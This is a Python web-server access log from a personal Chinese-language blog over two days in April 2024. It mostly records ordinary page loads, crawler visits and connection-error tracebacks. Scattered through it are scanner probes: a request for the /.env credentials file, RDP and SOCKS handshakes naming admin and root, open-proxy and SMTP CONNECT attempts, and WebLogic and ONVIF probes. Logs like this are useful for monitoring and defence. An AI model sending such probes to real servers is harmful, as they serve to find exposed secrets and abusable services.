+185.47.172.136 - - [08/Apr/2024 19:29:23] code 400, message Bad request version ('À\x14À')
+185.47.172.136 - - [08/Apr/2024 19:29:23] " u  q\ñC-n¥«Ó¬á)/EÐX"öê%(		ñ*ªq¾  À/À+ÀÀÀÀ	ÀÀ" 400 -
+52.167.144.192 - - [08/Apr/2024 19:41:45] "GET /posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%94%B6%E7%BC%A9%E5%BC%95%E6%93%8Eyacy/ HTTP/1.1" 200 -
+2.57.149.34 - - [08/Apr/2024 22:06:30] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+2.57.149.34 - - [08/Apr/2024 22:06:30] "  /*à     Cookie: mstshash=Administr" 400 -
+157.55.39.10 - - [08/Apr/2024 23:12:01] "GET /resource/health/ HTTP/1.1" 200 -
+60.191.125.35 - - [08/Apr/2024 23:20:47] code 404, message File not found
+60.191.125.35 - - [08/Apr/2024 23:20:47] "HEAD http://112.124.42.80:63435/ HTTP/1.1" 404 -
+40.77.167.8 - - [09/Apr/2024 00:33:30] "GET /posts/%E6%92%AD%E5%AE%A2%E8%BD%AC%E8%AF%91%E6%96%B9%E6%B3%95/ HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 00:51:53] "GET / HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 00:51:55] "GET /css/reset.css HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 00:51:56] "GET /css/font.css HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 00:51:56] "GET /css/smigle.css HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 00:51:56] "GET /images/wxf.jpg HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 00:51:58] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 00:51:58] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 00:52:24] "GET /project/ HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 00:52:46] "GET /resource/%E7%A6%8F%E6%A0%BC%E8%A1%8C%E4%B8%BA%E6%A8%A1%E5%9E%8B/ HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 00:52:47] "GET /img/1712492720_Bdgeohw2.jpg HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 00:52:48] "GET /img/202404072047.png HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 00:52:48] "GET /img/202404072048.png HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 00:52:54] "GET /resource/%E5%A6%82%E4%BD%95%E5%A4%8D%E7%9B%98/ HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('104.28.245.200', 9440)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+104.28.245.200 - - [09/Apr/2024 01:01:07] "GET /project/ HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 01:01:11] "GET /favicon-32x32.png HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 01:03:37] "GET /resource/%E5%BB%B6%E8%BF%9F%E6%BB%A1%E8%B6%B3/ HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 01:03:46] "GET /resource/%E7%AD%96%E7%95%A5-%E8%BF%BD%E8%B8%AA%E6%A8%A1%E5%9E%8B/ HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 01:03:48] "GET /resource/%E6%9C%9F%E6%9C%9B-%E7%8E%B0%E5%AE%9E%E6%A8%A1%E5%9E%8B/ HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 01:04:21] "GET /resource/%E5%9F%BA%E5%87%86%E6%AF%94%E5%AF%B9+%E7%8E%AF%E5%A2%83%E5%88%87%E6%8D%A2/ HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 01:06:57] "GET /project/ HTTP/1.1" 304 -
+104.28.245.201 - - [09/Apr/2024 01:26:39] "GET / HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 01:26:41] "GET /css/reset.css HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 01:26:42] "GET /css/font.css HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 01:26:42] "GET /css/smigle.css HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 01:26:43] "GET /images/wxf.jpg HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 01:26:44] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 01:26:44] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 01:26:47] "GET /project/ HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 01:26:49] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 01:26:49] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 01:26:52] "GET /resource/%E6%96%AF%E5%9D%A6%E7%A6%8F%E4%BA%BA%E7%94%9F%E8%AE%BE%E8%AE%A1/ HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 01:26:54] "GET /img/2024-04-09012019.jpg HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 01:27:23] "GET /favicon-32x32.png HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 01:27:44] "GET /project/ HTTP/1.1" 304 -
+104.28.245.200 - - [09/Apr/2024 01:27:46] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 01:27:47] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 01:27:59] "GET /resource/%E7%A6%8F%E6%A0%BC%E8%A1%8C%E4%B8%BA%E6%A8%A1%E5%9E%8B/ HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 01:28:00] "GET /img/202404072047.png HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 01:28:00] "GET /img/1712492720_Bdgeohw2.jpg HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 01:28:01] "GET /img/202404072048.png HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('104.28.245.200', 15515)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+104.28.245.200 - - [09/Apr/2024 01:28:12] "GET /resource/%E9%A2%86%E5%9F%9F%E9%A9%B1%E5%8A%A8+%E6%90%AD%E7%A7%AF%E6%9C%A8/ HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 01:28:12] "GET /img/Snipaste_2024-04-02_00-52-21.png HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 01:28:12] "GET /img/Snipaste_2024-04-02_01-13-36.png HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 01:28:13] "GET /img/Snipaste_2024-04-02_01-14-11.png HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 01:28:13] "GET /img/Snipaste_2024-04-02_01-14-19.png HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 01:28:13] "GET /img/Snipaste_2024-04-02_01-14-36.png HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 01:28:13] "GET /img/Snipaste_2024-04-02_01-14-26.png HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 01:29:46] "GET /project/ HTTP/1.1" 304 -
+52.167.144.16 - - [09/Apr/2024 02:32:13] "GET /resource/ref-%E6%B5%85%E8%B0%88%E6%9C%80%E4%BD%B3%E5%AD%A6%E4%B9%A0%E8%B7%AF%E5%BE%84/ HTTP/1.1" 200 -
+192.241.204.26 - - [09/Apr/2024 03:21:46] code 400, message Bad request version ('À\x14À')
+192.241.204.26 - - [09/Apr/2024 03:21:46] " {  wFm~©(MÃ+»ÖiÛ"¦ËYM±öëy³,)-,§  À/À+ÀÀÀÀ	ÀÀ" 400 -
+80.66.83.46 - - [09/Apr/2024 03:23:33] code 400, message Bad HTTP/0.9 request type ('\x04\x01\x00\x194e')
+80.66.83.46 - - [09/Apr/2024 03:23:33] " 4e	 " 400 -
+80.66.83.46 - - [09/Apr/2024 03:24:33] code 501, message Unsupported method ('CONNECT')
+80.66.83.46 - - [09/Apr/2024 03:24:33] "CONNECT hotmail-com.olc.protection.outlook.com:25 HTTP/1.1" 501 -
+80.66.83.46 - - [09/Apr/2024 03:24:34] code 400, message Bad request syntax ('\x05\x01\x00')
+80.66.83.46 - - [09/Apr/2024 03:24:34] " " 400 -
+205.210.31.230 - - [09/Apr/2024 03:46:05] "GET / HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('205.210.31.230', 64206)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 657, in do_GET
+    f = self.send_head()
+  File "/usr/lib/python3.9/http/server.py", line 751, in send_head
+    self.end_headers()
+  File "/usr/lib/python3.9/http/server.py", line 529, in end_headers
+    self.flush_headers()
+  File "/usr/lib/python3.9/http/server.py", line 533, in flush_headers
+    self.wfile.write(b"".join(self._headers_buffer))
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+49.234.176.157 - - [09/Apr/2024 04:24:27] code 404, message File not found
+49.234.176.157 - - [09/Apr/2024 04:24:27] "GET /.env HTTP/1.1" 404 -
+52.167.144.16 - - [09/Apr/2024 05:07:00] "GET /project/ HTTP/1.1" 200 -
+80.66.83.46 - - [09/Apr/2024 05:23:26] code 400, message Bad request syntax ('\x04\x01\x00PPBS.\x00')
+80.66.83.46 - - [09/Apr/2024 05:23:26] " PPBS. " 400 -
+80.66.83.46 - - [09/Apr/2024 05:24:26] code 400, message Bad request syntax ('\x05\x01\x00')
+80.66.83.46 - - [09/Apr/2024 05:24:26] " " 400 -
+80.66.83.46 - - [09/Apr/2024 05:24:26] code 501, message Unsupported method ('CONNECT')
+80.66.83.46 - - [09/Apr/2024 05:24:26] "CONNECT 80.66.83.46:80 HTTP/1.1" 501 -
+47.236.251.77 - - [09/Apr/2024 05:28:54] code 404, message File not found
+47.236.251.77 - - [09/Apr/2024 05:28:54] "GET http://passport.baidu.com/ HTTP/1.1" 404 -
+47.236.251.77 - - [09/Apr/2024 05:29:10] code 400, message Bad request syntax ('\x05\x01\x00')
+47.236.251.77 - - [09/Apr/2024 05:29:10] " " 400 -
+47.236.251.77 - - [09/Apr/2024 05:29:14] code 400, message Bad request syntax ('\x04\x01\x00Pg)§ê\x00')
+47.236.251.77 - - [09/Apr/2024 05:29:14] " Pg)§ê " 400 -
+182.138.158.93 - - [09/Apr/2024 05:55:28] code 400, message Bad request syntax ('\x04\x01\x00PnòD\x04\x00')
+182.138.158.93 - - [09/Apr/2024 05:55:28] " PnòD " 400 -
+207.46.13.116 - - [09/Apr/2024 06:20:03] "GET /resource/%E7%A6%8F%E6%A0%BC%E8%A1%8C%E4%B8%BA%E6%A8%A1%E5%9E%8B/ HTTP/1.1" 200 -
+198.199.106.81 - - [09/Apr/2024 06:22:25] code 400, message Bad request syntax ('MGLNDD_117.50.186.154_8000')
+198.199.106.81 - - [09/Apr/2024 06:22:25] "MGLNDD_117.50.186.154_8000" 400 -
+8.210.70.179 - - [09/Apr/2024 06:35:19] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03¯Ó#\x03\x9bM´Ò0')
+8.210.70.179 - - [09/Apr/2024 06:35:19] " î  ê¯Ó#M´Ò0 OWX!öè¯éP¶4­þ" 400 -
+8.210.70.179 - - [09/Apr/2024 06:38:39] "GET / HTTP/1.1" 200 -
+8.210.70.179 - - [09/Apr/2024 06:38:58] "GET /apple-touch-icon.png HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 06:57:55] "GET / HTTP/1.1" 304 -
+104.28.245.200 - - [09/Apr/2024 07:23:04] "GET /project/ HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 07:23:05] "GET /css/reset.css HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 07:23:05] "GET /css/font.css HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 07:23:06] "GET /css/smigle.css HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 07:23:06] "GET /images/wxf.jpg HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 07:23:08] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 07:23:08] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 07:23:44] "GET /project/ HTTP/1.1" 304 -
+104.28.245.201 - - [09/Apr/2024 07:23:47] "GET /favicon-32x32.png HTTP/1.1" 200 -
+52.167.144.137 - - [09/Apr/2024 07:33:28] "GET /posts/ HTTP/1.1" 200 -
+47.236.251.7 - - [09/Apr/2024 07:56:19] code 400, message Bad request syntax ('\x05\x01\x00')
+47.236.251.7 - - [09/Apr/2024 07:56:19] " " 400 -
+47.236.251.7 - - [09/Apr/2024 07:56:21] code 404, message File not found
+47.236.251.7 - - [09/Apr/2024 07:56:21] "GET http://passport.baidu.com/ HTTP/1.1" 404 -
+47.236.251.7 - - [09/Apr/2024 07:56:33] code 400, message Bad request syntax ('\x04\x01\x00Pg)§ê\x00')
+47.236.251.7 - - [09/Apr/2024 07:56:33] " Pg)§ê " 400 -
+52.83.92.55 - - [09/Apr/2024 08:40:46] code 400, message Bad request version ('OÑËÜ®Ëd')
+52.83.92.55 - - [09/Apr/2024 08:40:46] "   TZ         .    I¨À )z» zÚf Ò~Uñi»©                ÃÐ¢|¦v½óOÑËÜ®Ëd" 400 -
+49.7.207.246 - - [09/Apr/2024 09:42:05] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00àZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x05\x01=K\x00\x00\x01\x01a')
+49.7.207.246 - - [09/Apr/2024 09:42:05] "   àZ          =K  a	 " 400 -
+49.7.207.246 - - [09/Apr/2024 09:42:06] code 400, message Bad HTTP/0.9 request type ('l\x00')
+49.7.207.246 - - [09/Apr/2024 09:42:06] "l          " 400 -
+49.7.207.246 - - [09/Apr/2024 09:42:06] code 400, message Bad request syntax ('\x05\x04\x00\x01\x02\x80\x05\x01\x00\x03')
+49.7.207.246 - - [09/Apr/2024 09:42:06] "  " 400 -
+49.7.207.246 - - [09/Apr/2024 09:42:07] code 400, message Bad request syntax ('\x04\x01\x00\x16\x7f\x00\x00\x01root\x00')
+49.7.207.246 - - [09/Apr/2024 09:42:07] "   root " 400 -
+49.7.207.246 - - [09/Apr/2024 09:42:08] code 400, message Bad request syntax ('\x16\x03\x01\x00c\x01\x00\x00_\x03\x01¥«ê"³Ú\\eê!ÙeW\x86\x82\'Æì#±oE|Á\x9cxÅ\x8cÕ¬d3\x00\x00\x12À')
+49.7.207.246 - - [09/Apr/2024 09:42:08] " c  _¥«ê"³Ú\eê!ÙeW'Æì#±oE|ÁxÅÕ¬d3  À" 400 -
+49.7.207.246 - - [09/Apr/2024 09:42:08] "GET / HTTP/1.1" 200 -
+49.7.207.246 - - [09/Apr/2024 09:42:08] "GET /favicon-32x32.png HTTP/1.1" 200 -
+49.7.207.246 - - [09/Apr/2024 09:42:08] code 501, message Unsupported method ('POST')
+49.7.207.246 - - [09/Apr/2024 09:42:08] "POST /onvif/device_service HTTP/1.1" 501 -
+205.210.31.80 - - [09/Apr/2024 10:40:28] "GET / HTTP/1.1" 200 -
+52.167.144.235 - - [09/Apr/2024 11:42:17] "GET /resource/%E9%87%91%E9%92%B1%E8%A7%82/ HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('78.128.114.22', 2666)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 395, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.9/socket.py", line 704, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception occurred during processing of request from ('78.128.114.22', 3226)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 395, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.9/socket.py", line 704, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+178.159.37.98 - - [09/Apr/2024 12:04:27] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+178.159.37.98 - - [09/Apr/2024 12:04:27] "  /*à     Cookie: mstshash=Administr" 400 -
+207.46.13.102 - - [09/Apr/2024 12:22:27] code 404, message File not found
+207.46.13.102 - - [09/Apr/2024 12:22:27] "GET /sitemap.xml.gz HTTP/1.1" 404 -
+91.240.118.187 - - [09/Apr/2024 13:22:12] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+91.240.118.187 - - [09/Apr/2024 13:22:12] "  /*à     Cookie: mstshash=Administr" 400 -
+205.210.31.100 - - [09/Apr/2024 14:15:24] "GET / HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('205.210.31.100', 59040)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 657, in do_GET
+    f = self.send_head()
+  File "/usr/lib/python3.9/http/server.py", line 751, in send_head
+    self.end_headers()
+  File "/usr/lib/python3.9/http/server.py", line 529, in end_headers
+    self.flush_headers()
+  File "/usr/lib/python3.9/http/server.py", line 533, in flush_headers
+    self.wfile.write(b"".join(self._headers_buffer))
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+40.77.167.25 - - [09/Apr/2024 14:56:53] "GET /resource/workflow_inbox/ HTTP/1.1" 200 -
+157.55.39.14 - - [09/Apr/2024 16:40:01] "GET /resource/%E8%AE%BE%E8%AE%A1%E4%BA%BA%E7%94%9F-%E7%BA%A6%E6%9D%9F%E6%A8%A1%E5%9E%8B/ HTTP/1.1" 200 -
+115.231.78.7 - - [09/Apr/2024 17:06:22] code 400, message Bad request version ('F\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbXcsXctst\x00\x00\x00\x00\x00\x00')
+115.231.78.7 - - [09/Apr/2024 17:06:22] "   TZ          0I    ¨À )t F tsXrcsXYs9                      bbXcsXctst      " 400 -
+223.113.128.147 - - [09/Apr/2024 17:29:56] "GET / HTTP/1.1" 200 -
+223.113.128.147 - - [09/Apr/2024 17:29:57] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03')
+223.113.128.147 - - [09/Apr/2024 17:29:57] " î  ê ª>Z{" 400 -
+223.113.128.147 - - [09/Apr/2024 17:29:57] code 400, message Bad HTTP/0.9 request type ('t3')
+223.113.128.147 - - [09/Apr/2024 17:29:57] "t3 12.1.2" 400 -
+87.246.7.78 - - [09/Apr/2024 17:32:00] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+87.246.7.78 - - [09/Apr/2024 17:32:00] "  /*à     Cookie: mstshash=Administr" 400 -
+104.28.245.200 - - [09/Apr/2024 18:59:14] "GET / HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 18:59:15] "GET /css/font.css HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 18:59:15] "GET /css/reset.css HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 18:59:16] "GET /css/smigle.css HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 18:59:17] "GET /images/wxf.jpg HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 18:59:19] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 18:59:20] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 18:59:37] "GET /project/ HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 18:59:40] "GET /posts/ HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 18:59:47] "GET /resource/list-infostream-src/ HTTP/1.1" 200 -
+65.49.1.11 - - [09/Apr/2024 19:29:48] "GET / HTTP/1.1" 200 -
+65.49.1.19 - - [09/Apr/2024 19:30:02] "GET /favicon.ico HTTP/1.1" 200 -
+65.49.1.20 - - [09/Apr/2024 19:30:06] code 404, message File not found
+65.49.1.20 - - [09/Apr/2024 19:30:06] "GET http://api.ipify.org/?format=json HTTP/1.1" 404 -
+65.49.1.21 - - [09/Apr/2024 19:30:17] code 501, message Unsupported method ('CONNECT')
+65.49.1.21 - - [09/Apr/2024 19:30:17] "CONNECT www.shadowserver.org:443 HTTP/1.1" 501 -
+104.28.245.201 - - [09/Apr/2024 19:47:06] "GET /resource/ref-%E5%AD%A6%E4%B9%A0/ HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 19:48:20] "GET /resource/ref-%E6%B5%85%E8%B0%88%E6%9C%80%E4%BD%B3%E5%AD%A6%E4%B9%A0%E8%B7%AF%E5%BE%84/ HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 19:48:21] "GET /img/Snipaste_2024-03-05_11-20-03.png HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 19:48:22] "GET /img/Snipaste_2024-03-05_11-20-27.png HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 19:48:26] "GET /resource/%E5%85%B3%E4%BA%8E%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%80%9D%E8%80%83/ HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 19:48:28] "GET /img/2023-08-19_07-23-03.png HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 19:48:28] "GET /img/2023-08-19_08-15-46.png HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 19:49:52] "GET /resource/%E5%85%B3%E9%94%AE%E7%82%B9/ HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 19:49:55] "GET /resource/%E5%A6%82%E4%BD%95%E9%80%82%E5%BA%94%E4%B8%80%E5%AE%B6%E5%85%AC%E5%8F%B8/ HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 19:50:42] "GET /resource/%E9%A2%86%E5%9F%9F%E9%A9%B1%E5%8A%A8+%E6%90%AD%E7%A7%AF%E6%9C%A8/ HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 19:50:42] "GET /img/Snipaste_2024-04-02_00-52-21.png HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 19:50:44] "GET /img/Snipaste_2024-04-02_01-13-36.png HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 19:50:44] "GET /img/Snipaste_2024-04-02_01-14-11.png HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 19:50:44] "GET /img/Snipaste_2024-04-02_01-14-19.png HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 19:50:44] "GET /img/Snipaste_2024-04-02_01-14-26.png HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 19:50:44] "GET /img/Snipaste_2024-04-02_01-14-36.png HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('104.28.245.201', 57304)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+----------------------------------------
+Exception occurred during processing of request from ('104.28.245.201', 62793)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
